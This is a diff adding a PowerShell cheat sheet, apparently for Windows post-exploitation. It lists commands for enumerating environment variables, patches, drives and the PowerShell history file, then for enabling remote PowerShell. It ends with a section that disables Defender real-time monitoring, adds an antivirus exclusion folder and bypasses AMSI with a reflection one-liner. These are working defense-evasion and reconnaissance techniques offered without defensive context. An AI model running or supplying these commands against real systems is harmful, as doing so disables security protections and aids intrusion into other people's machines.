@@ -1,0 +1,53 @@
+--- Environment
+
+# desc: get all values
+Get-ChildItem Env: | ft Key,Value 
+
+$env:UserName
+
+--- OS Version and HotFixes
+
+# desc: Current OS version
+[System.Environment]::OSVersion.Version 
+
+# desc: List all patches
+Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} 
+
+# desc: List only "Security Update" patches
+Get-Hotfix -description "Security update" 
+
+--- Other connected drives
+
+Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+
+--- PS History
+
+Get-Content C:\Users\#{USER}\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+
+--- Enable WinRM (Remote PS)
+
+# desc: enables winrm
+enable-psremoting -force 
+
+# desc: Change NetWorkConnection Category to Private
+# Requires -RunasAdministrator
+Get-NetConnectionProfile |
+  Where{ $_.NetWorkCategory -ne 'Private'} |
+  ForEach {
+    $_
+    $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
+  }
+
+--- Antivirus
+
+# desc: Check status
+Get-MpComputerStatus
+
+# desc: Disable
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# desc: Set exclusion path
+Add-MpPreference -ExclusionPath "C:\users\public\documents\magichk"
+
+# desc: Disable AMSI
+"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
